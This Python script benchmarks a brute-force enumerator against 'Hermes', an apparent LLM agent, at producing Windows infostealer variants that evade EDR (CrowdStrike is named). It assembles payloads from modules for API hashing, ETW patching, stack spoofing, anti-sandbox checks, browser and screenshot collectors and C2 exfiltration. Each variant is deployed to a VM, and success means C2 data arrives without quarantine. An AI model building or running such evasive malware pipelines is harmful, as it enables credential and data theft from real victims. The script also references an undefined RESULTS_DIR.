#!/usr/bin/env python3 -u
"""
Algo vs Hermes: combinatorial enumerator vs LLM-driven search.

The algo generates variants from the cross-product of all chunk axes:
  api_resolve(7) × exfil(6) × arch(6) × evasion(14K+) × obfusc(2) × collectors(3)
  = ~21M detection-distinct PE variants, plus JScript/VBS formats.

No hard ceiling. Tiers prioritize proven combos first, then systematically
expand into unexplored territory.
"""

import asyncio
import hashlib
import itertools
import json
import logging
import os
import random
import re
import sys
import time
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from hermes.config import get_config
from hermes.tools import ToolExecutor

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("algo_vs_hermes")

PROJECT_ROOT = Path(__file__).parent.parent
CHUNKS_DIR = PROJECT_ROOT / "templates" / "chunks"
RECIPES_DIR = CHUNKS_DIR / "recipes"


# ── PE Axes ──────────────────────────────────────────────────────

PE_API_RESOLVE = [
    "api_resolve/api_hash_djb2",
    "api_resolve/api_hash_fnv1a",
    "api_resolve/api_hash_crc32",
    "api_resolve/api_hash_ror13",
    "api_resolve/peb_walk",
    "api_resolve/ldr_get_proc",
    "api_resolve/api_set_redirect",
]

PE_EXFIL = [
    "exfil/tcp_direct",
    "exfil/tcp_direct_v2",
    "exfil/tcp_flush",
    "exfil/http_post",
    "exfil/winhttp_api",
    "exfil/winhttp_get",
]

PE_ARCH = [
    "arch/sequential",
    "arch/threaded",
    "arch/fiber",
    "arch/tp_work",
    "arch/callback_enumwindows",
    "arch/callback_certenumsystem",
]

COLLECTOR_SETS = [
    ["collectors/system_info", "collectors/processes", "collectors/env_vars",
     "collectors/browser_chromium", "collectors/screenshot"],
    ["collectors/system_info_api", "collectors/processes_api",
     "collectors/netinfo_api", "collectors/env_vars", "collectors/screenshot"],
    ["collectors/system_info", "collectors/processes", "collectors/screenshot"],
]

OBFUSC_LEVELS = ["none", "light"]

# Evasion: pick 0 or 1 chunk from each functional group.
# None = skip that group entirely. Cross-product across groups.
EVASION_GROUPS = [
    # Stack obfuscation
    [None, "evasion/stack_spoof", "evasion/thread_stack_spoof",
     "evasion/stack_spoof_gadget", "evasion/stack_spoof_rop"],
    # Import padding
    [None, "evasion/iat_pad", "evasion/entropy_pad", "evasion/section_merge"],
    # Timing/behavioral
    [None, "evasion/behavioral_pacing", "evasion/sleep_jitter"],
    # Sleep obfuscation
    [None, "evasion/sleep_ekko", "evasion/sleep_cronos",
     "evasion/sleep_foliage", "evasion/sleep_gargoyle"],
    # ETW bypass
    [None, "evasion/etw_patch", "evasion/etw_full_patch"],
    # Anti-debug
    [None, "evasion/anti_debug", "evasion/anti_debug_hwbp",
     "evasion/anti_debug_ntquery"],
    # Anti-sandbox
    [None, "evasion/anti_sandbox", "evasion/anti_sandbox_timing",
     "evasion/anti_sandbox_wmi"],
]

# Proven evasion profiles — tried-and-tested combos go first
PROVEN_EVASION = [
    ["evasion/stack_spoof", "evasion/iat_pad", "evasion/behavioral_pacing"],
    ["evasion/stack_spoof", "evasion/iat_pad"],
    ["evasion/iat_pad", "evasion/behavioral_pacing"],
    ["evasion/iat_pad"],
    [],
    ["evasion/stack_spoof", "evasion/iat_pad", "evasion/sleep_ekko"],
    ["evasion/stack_spoof", "evasion/iat_pad", "evasion/etw_patch"],
    ["evasion/stack_spoof", "evasion/iat_pad", "evasion/behavioral_pacing",
     "evasion/sleep_ekko"],
    ["evasion/thread_stack_spoof", "evasion/iat_pad", "evasion/behavioral_pacing"],
    ["evasion/stack_spoof", "evasion/entropy_pad", "evasion/behavioral_pacing"],
    ["evasion/stack_spoof", "evasion/iat_pad", "evasion/anti_debug",
     "evasion/anti_sandbox"],
    ["evasion/stack_spoof", "evasion/iat_pad", "evasion/sleep_ekko",
     "evasion/etw_patch", "evasion/behavioral_pacing"],
]


# ── Validation ───────────────────────────────────────────────────

def _validate_on_disk():
    """Remove chunks from axes that don't exist on disk."""
    available = set()
    for cat_dir in CHUNKS_DIR.iterdir():
        if not cat_dir.is_dir() or cat_dir.name in ("recipes", "__pycache__"):
            continue
        for f in cat_dir.iterdir():
            if f.suffix in (".c", ".h", ".js", ".vbs"):
                available.add(f"{cat_dir.name}/{f.stem}")

    PE_API_RESOLVE[:] = [a for a in PE_API_RESOLVE if a in available]
    PE_EXFIL[:] = [e for e in PE_EXFIL if e in available]
    PE_ARCH[:] = [a for a in PE_ARCH if a in available]
    for i, group in enumerate(EVASION_GROUPS):
        EVASION_GROUPS[i] = [o for o in group if o is None or o in available]
    for cset in COLLECTOR_SETS:
        cset[:] = [c for c in cset if c in available]
    for profile in PROVEN_EVASION:
        profile[:] = [e for e in profile if e in available]


# ── Combo generation ─────────────────────────────────────────────

def _combo_key(combo: dict) -> tuple:
    return (combo.get("api_resolve", ""), combo["exfil"], combo["arch"],
            tuple(sorted(combo["evasion"])), combo["obfusc"],
            tuple(combo["collectors"]))


def count_total_combos() -> dict:
    """Count combos per tier and total."""
    ev_product = 1
    for group in EVASION_GROUPS:
        ev_product *= len(group)

    base = len(PE_API_RESOLVE) * len(PE_EXFIL) * len(PE_ARCH)
    n_coll = len(COLLECTOR_SETS)
    n_proven = len(PROVEN_EVASION)

    tier1 = 1 * 1 * 1 * n_proven * n_coll          # djb2 × tcp × seq
    tier2 = len(PE_API_RESOLVE) * n_proven * n_coll  # all api × proven
    tier3 = base * n_proven * n_coll                  # all api×exfil×arch × proven
    tier4 = base * ev_product * n_coll                # full evasion, no obfusc
    tier5 = tier4                                      # light obfusc
    total = tier4 + tier5  # tiers 1-3 are subsets of tier4

    js_recipes = sum(1 for f in RECIPES_DIR.glob("js_*.yaml"))
    vbs_recipes = sum(1 for f in RECIPES_DIR.glob("vbs_*.yaml"))

    return {
        "tier1": tier1, "tier2": tier2, "tier3": tier3,
        "tier4_5_total": total,
        "js_recipes": js_recipes, "vbs_recipes": vbs_recipes,
        "axes": {
            "api_resolve": len(PE_API_RESOLVE),
            "exfil": len(PE_EXFIL),
            "arch": len(PE_ARCH),
            "evasion_combos": ev_product,
            "evasion_groups": len(EVASION_GROUPS),
            "obfusc": len(OBFUSC_LEVELS),
            "collectors": n_coll,
        },
    }


def generate_combos():
    """Yield PE combo dicts in tiered priority order. Never repeats.

    Tier 1: proven api + proven exfil + sequential + proven evasion
    Tier 2: all api × proven evasion
    Tier 3: all api × exfil × arch × proven evasion (shuffled)
    Tier 4: full evasion cross-product, no obfusc
    Tier 5: full evasion cross-product, light obfusc
    Tier 6: JScript recipes on disk
    Tier 7: VBS recipes on disk
    """
    seen = set()

    def _make(api, exfil, arch, evasion, obfusc, collectors, fmt="pe"):
        combo = {
            "format": fmt,
            "api_resolve": api,
            "exfil": exfil,
            "arch": arch,
            "evasion": list(evasion),
            "obfusc": obfusc,
            "collectors": list(collectors),
            "resources": True,
        }
        key = _combo_key(combo)
        if key in seen:
            return None
        seen.add(key)
        return combo

    # ── Tier 1: proven core ──
    logger.info("Tier 1: proven core combos")
    for ev in PROVEN_EVASION:
        for coll in COLLECTOR_SETS:
            c = _make("api_resolve/api_hash_djb2", "exfil/tcp_direct",
                       "arch/sequential", ev, "none", coll)
            if c:
                yield c

    # ── Tier 2: vary api_resolve ──
    logger.info("Tier 2: vary api_resolve")
    for api in PE_API_RESOLVE:
        for ev in PROVEN_EVASION:
            for coll in COLLECTOR_SETS:
                c = _make(api, "exfil/tcp_direct", "arch/sequential",
                          ev, "none", coll)
                if c:
                    yield c

    # ── Tier 3: vary api × exfil × arch (shuffled within tier) ──
    logger.info("Tier 3: vary api × exfil × arch with proven evasion")
    tier3 = []
    for api, exfil, arch in itertools.product(PE_API_RESOLVE, PE_EXFIL, PE_ARCH):
        for ev in PROVEN_EVASION:
            for coll in COLLECTOR_SETS:
                c = _make(api, exfil, arch, ev, "none", coll)
                if c:
                    tier3.append(c)
    random.shuffle(tier3)
    yield from tier3

    # ── Tier 4: full evasion cross-product, no obfusc ──
    logger.info("Tier 4: full evasion expansion (no obfusc)")
    evasion_axes = [g for g in EVASION_GROUPS if len(g) > 1]
    for ev_combo in itertools.product(*evasion_axes):
        ev = [e for e in ev_combo if e is not None]
        for api, exfil, arch in itertools.product(PE_API_RESOLVE, PE_EXFIL, PE_ARCH):
            for coll in COLLECTOR_SETS:
                c = _make(api, exfil, arch, ev, "none", coll)
                if c:
                    yield c

    # ── Tier 5: light obfuscation ──
    logger.info("Tier 5: light obfuscation variants")
    for ev_combo in itertools.product(*evasion_axes):
        ev = [e for e in ev_combo if e is not None]
        for api, exfil, arch in itertools.product(PE_API_RESOLVE, PE_EXFIL, PE_ARCH):
            for coll in COLLECTOR_SETS:
                c = _make(api, exfil, arch, ev, "light", coll)
                if c:
                    yield c

    # ── Tier 6: JScript recipes on disk ──
    logger.info("Tier 6: JScript recipes")
    for recipe_file in sorted(RECIPES_DIR.glob("js_*.yaml")):
        name = recipe_file.stem
        yield {"format": "jscript", "recipe": name}

    # ── Tier 7: VBS recipes on disk ──
    logger.info("Tier 7: VBS recipes")
    for recipe_file in sorted(RECIPES_DIR.glob("vbs_*.yaml")):
        name = recipe_file.stem
        yield {"format": "vbs", "recipe": name}


# ── Binary path extraction ───────────────────────────────────────

def _extract_binary_path(assemble_output: str) -> str | None:
    m = re.search(r"Assembled and compiled:\s+(\S+)", assemble_output)
    if m and os.path.exists(m.group(1)):
        return m.group(1)

    m = re.search(r"Assembled source:\s+(\S+)", assemble_output)
    if m:
        src = Path(m.group(1))
        odir = src.parent
        for name in ("payload.exe", "payload.dll", "payload.cpl",
                      "payload.js", "payload.vbs"):
            candidate = odir / name
            if candidate.exists():
                return str(candidate)

    m = re.search(r"Output dir:\s+(\S+)", assemble_output)
    if m:
        odir = Path(m.group(1))
        for name in ("payload.exe", "payload.dll", "payload.cpl",
                      "payload.js", "payload.vbs"):
            candidate = odir / name
            if candidate.exists():
                return str(candidate)
    return None


# ── Run a single combo ───────────────────────────────────────────

async def run_combo(tools: ToolExecutor, combo: dict, attempt: int,
                    quarantined: set) -> dict:
    """Execute one combo against the VM. Returns result dict."""
    is_pe = combo.get("format", "pe") == "pe"

    if is_pe:
        recipe_name = f"algo_{attempt}"
        create_result = await tools.tool_create_recipe(
            name=recipe_name,
            format_type="c",
            collectors=combo["collectors"],
            exfil=combo["exfil"],
            arch=combo["arch"],
            evasion=combo["evasion"] or None,
            api_resolve=combo["api_resolve"],
            resources=combo.get("resources", True),
            vars={"C2_IP": "10.0.2.2", "C2_PORT": "9001"},
        )
        if "ERROR" in create_result:
            return {"success": False, "error": f"recipe: {create_result[:120]}"}

        asm = await tools.tool_assemble(
            recipe=recipe_name, compile=True,
            obfuscation=combo["obfusc"], randomize=False,
        )
    else:
        recipe_name = combo["recipe"]
        asm = await tools.tool_assemble(
            recipe=recipe_name,
            compile=is_pe,
            obfuscation="none",
            randomize=False,
        )

    recipe_path = RECIPES_DIR / f"{recipe_name}.yaml"

    if "ERROR" in asm:
        recipe_path.unlink(missing_ok=True)
        return {"success": False, "error": f"build: {asm[:120]}"}

    binary = _extract_binary_path(asm)
    if not binary:
        recipe_path.unlink(missing_ok=True)
        return {"success": False, "error": "no binary in output"}

    with open(binary, "rb") as f:
        bhash = hashlib.sha256(f.read()).hexdigest()
    if bhash in quarantined:
        recipe_path.unlink(missing_ok=True)
        return {"success": False, "error": f"hash {bhash[:12]} already quarantined"}

    bsize = os.path.getsize(binary)

    await tools.tool_cleanup_vm()
    await tools.tool_start_c2_listener(port=9001, protocol="auto", timeout=120)

    if is_pe:
        remote_name = "payload.exe"
        exec_via = "direct"
    elif combo.get("format") == "jscript":
        remote_name = "payload.js"
        exec_via = "cscript"
    else:
        remote_name = "payload.vbs"
        exec_via = "cscript"

    deploy = await tools.tool_deploy_to_vm(
        local_path=binary, remote_filename=remote_name,
        execute=True, execute_via=exec_via,
    )

    if "quarantined" in deploy.lower() or "ERROR" in deploy:
        quarantined.add(bhash)
        recipe_path.unlink(missing_ok=True)
        return {"success": False, "error": "quarantined", "size": bsize}

    await asyncio.sleep(20)

    analysis = await tools.tool_analyze_results(binary_name=remote_name)
    c2_data = await tools.tool_check_c2_data(port=9001)

    success = False
    c2_bytes = 0
    if "Verdict: SUCCESS" in analysis:
        m = re.search(r"Total bytes:\s*(\d+)", c2_data)
        if m:
            c2_bytes = int(m.group(1))
            if c2_bytes > 100:
                success = True

    await tools.tool_cleanup_vm()
    recipe_path.unlink(missing_ok=True)

    return {
        "success": success,
        "size": bsize,
        "c2_bytes": c2_bytes,
        "analysis": analysis[:200],
    }


# ── Algorithmic run ──────────────────────────────────────────────

async def algorithmic_run(tools: ToolExecutor, max_rounds: int,
                          max_time: float) -> dict:
    """Walk the combo space. Stop on first success or limits."""
    _validate_on_disk()
    counts = count_total_combos()
    ax = counts["axes"]

    logger.info("=" * 60)
    logger.info("COMBO SPACE")
    logger.info("=" * 60)
    logger.info("  api_resolve:    %d options", ax["api_resolve"])
    logger.info("  exfil:          %d options", ax["exfil"])
    logger.info("  arch:           %d options", ax["arch"])
    logger.info("  evasion combos: %d (%d groups)", ax["evasion_combos"], ax["evasion_groups"])
    logger.info("  obfuscation:    %d levels", ax["obfusc"])
    logger.info("  collectors:     %d sets", ax["collectors"])
    logger.info("  JScript recipes:%d", counts["js_recipes"])
    logger.info("  VBS recipes:    %d", counts["vbs_recipes"])
    logger.info("  ─────────────────────────────")
    logger.info("  TOTAL PE:       %s variants", f"{counts['tier4_5_total']:,}")
    logger.info("  Tier 1 (proven): %d", counts["tier1"])
    logger.info("  Tier 2 (api):    %d", counts["tier2"])
    logger.info("  Tier 3 (full):   %d", counts["tier3"])
    logger.info("=" * 60)

    scan = await tools.tool_scan_target()
    if "RUNNING" not in scan and "running" not in scan.lower():
        logger.error("VM not ready: %s", scan[:100])
        return {"success": False, "attempts": 0, "wall_time": 0}

    start = time.monotonic()
    attempt = 0
    quarantined: set[str] = set()
    results_log = []

    results_path = RESULTS_DIR / "algo_progress.jsonl"
    results_path.parent.mkdir(exist_ok=True)

    for combo in generate_combos():
        elapsed = time.monotonic() - start
        if attempt >= max_rounds:
            logger.info("Hit max rounds (%d)", max_rounds)
            break
        if max_time and elapsed > max_time:
            logger.info("Hit max time (%.0fs)", max_time)
            break

        attempt += 1
        label = combo.get("recipe", "")
        if not label:
            api_short = combo["api_resolve"].split("/")[-1]
            exfil_short = combo["exfil"].split("/")[-1]
            arch_short = combo["arch"].split("/")[-1]
            ev_count = len(combo["evasion"])
            label = f"{api_short}+{exfil_short}+{arch_short}+{ev_count}ev+{combo['obfusc']}"

        logger.info("[%d/%.0fs] %s", attempt, elapsed, label)

        result = await run_combo(tools, combo, attempt, quarantined)
        result["attempt"] = attempt
        result["label"] = label
        result["elapsed"] = round(elapsed, 1)
        results_log.append(result)

        with open(results_path, "a") as f:
            f.write(json.dumps(result) + "\n")

        if result["success"]:
            logger.info("SUCCESS at attempt %d (%.1fs): %s — %d bytes",
                        attempt, elapsed, label, result.get("c2_bytes", 0))
            return {
                "success": True,
                "attempts": attempt,
                "wall_time": round(elapsed, 1),
                "winning_combo": label,
                "c2_bytes": result.get("c2_bytes", 0),
                "log": results_log,
            }

        err = result.get("error", "unknown")
        logger.info("  FAIL: %s", err[:80])

    elapsed = time.monotonic() - start
    logger.info("Exhausted %d combos in %.1fs", attempt, elapsed)
    return {
        "success": False,
        "attempts": attempt,
        "wall_time": round(elapsed, 1),
        "log": results_log,
    }


# ── Hermes run ───────────────────────────────────────────────────

async def hermes_run(max_rounds: int = 300, max_time: float = 0) -> dict:
    """Run Hermes autonomously."""
    from hermes.orchestrator import Hermes

    start = time.monotonic()

    hermes = Hermes(
        target_spec={"edr": "crowdstrike", "malware_type": "infostealer"},
        config={"max_rounds": max_rounds},
    )

    tool_calls_count = 0
    success_round = None

    def on_evt(evt_type, data):
        nonlocal tool_calls_count, success_round
        if evt_type == "tool_call":
            tool_calls_count += 1
            logger.info("[HERMES tool #%d] %s(%s)",
                        tool_calls_count, data["name"],
                        str(data.get("args", ""))[:60])
        elif evt_type == "campaign_success":
            success_round = data.get("round", "?")
            logger.info("[HERMES] Campaign SUCCESS at round %s", success_round)

    hermes.on_progress(on_evt)
    await hermes.run()
    elapsed = time.monotonic() - start

    rounds = hermes.session.current_round
    success = hermes._campaign_success

    logger.info("[HERMES] Done: %d rounds, %d tool calls, %.1fs, success=%s",
                rounds, tool_calls_count, elapsed, success)

    return {
        "success": success,
        "rounds": rounds,
        "tool_calls": tool_calls_count,
        "wall_time": round(elapsed, 1),
    }


# ── Main ─────────────────────────────────────────────────────────

async def main():
    import argparse
    parser = argparse.ArgumentParser(description="Algo vs Hermes comparison")
    parser.add_argument("--algo-only", action="store_true")
    parser.add_argument("--hermes-only", action="store_true")
    parser.add_argument("--max-rounds", type=int, default=500,
                        help="Max attempts per runner (default 500)")
    parser.add_argument("--max-time", type=float, default=0,
                        help="Max wall-clock seconds per runner (0=unlimited)")
    args = parser.parse_args()

    results = {}

    if not args.hermes_only:
        logger.info("=" * 60)
        logger.info("PHASE 1: ALGORITHMIC ENUMERATOR")
        logger.info("=" * 60)

        config = get_config()
        tools = ToolExecutor(config)
        algo_result = await algorithmic_run(tools, args.max_rounds, args.max_time)
        results["algo"] = {
            "success": algo_result["success"],
            "attempts": algo_result["attempts"],
            "wall_time": algo_result["wall_time"],
            "winning_combo": algo_result.get("winning_combo", ""),
            "c2_bytes": algo_result.get("c2_bytes", 0),
        }
        logger.info("ALGO RESULT: %s", json.dumps(results["algo"], indent=2))

        if not args.algo_only:
            await tools.tool_cleanup_vm()
            await asyncio.sleep(5)

    if not args.algo_only:
        logger.info("=" * 60)
        logger.info("PHASE 2: HERMES LLM-DRIVEN")
        logger.info("=" * 60)

        hermes_result = await hermes_run(
            max_rounds=args.max_rounds, max_time=args.max_time,
        )
        results["hermes"] = {
            "success": hermes_result["success"],
            "rounds": hermes_result["rounds"],
            "tool_calls": hermes_result["tool_calls"],
            "wall_time": hermes_result["wall_time"],
        }
        logger.info("HERMES RESULT: %s", json.dumps(results["hermes"], indent=2))

    if "algo" in results and "hermes" in results:
        a, h = results["algo"], results["hermes"]
        logger.info("=" * 60)
        logger.info("COMPARISON")
        logger.info("=" * 60)
        logger.info("                   Algorithmic     Hermes")
        logger.info("Success:           %-15s %s", a["success"], h["success"])
        logger.info("Attempts/rounds:   %-15s %s", a["attempts"], h["rounds"])
        logger.info("Wall time:         %-15s %ss", f'{a["wall_time"]}s', h["wall_time"])
        if a["success"] and h["success"]:
            ratio = h["wall_time"] / max(a["wall_time"], 0.1)
            faster = "slower" if ratio > 1 else "faster"
            factor = ratio if ratio > 1 else 1 / ratio
            logger.info("Speed:             Hermes is %.1fx %s", factor, faster)

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = RESULTS_DIR / f"algo_vs_hermes_{ts}.json"
    out_path.parent.mkdir(exist_ok=True)
    with open(out_path, "w") as f:
        json.dump(results, f, indent=2)
    logger.info("Results saved to %s", out_path)


if __name__ == "__main__":
    asyncio.run(main())
